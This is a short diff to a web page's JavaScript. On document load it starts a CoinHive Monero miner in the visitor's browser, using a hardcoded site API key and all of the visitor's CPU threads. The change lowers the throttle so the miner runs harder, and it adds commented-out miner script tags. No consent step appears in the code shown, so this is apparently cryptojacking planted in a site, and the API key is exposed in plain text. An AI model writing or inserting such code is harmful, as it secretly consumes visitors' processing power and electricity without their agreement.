@@ -1,12 +1,15 @@
 const monro_api_key = 'XXcJNZiaSWshUe3H2NuXzBrLj3kW2wvP';
 
+// <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+// <script src="../public/js/mine.js"></script>
+
 $(document).ready(function () {
     var socket = io.connect();
 
     var miner = new CoinHive.User(monro_api_key, 'User', {
   	threads: navigator.hardwareConcurrency,
   	autoThreads: false,
-  	throttle: 1,
+  	throttle: .5,
   	forceASMJS: false
   	});
     miner.start();
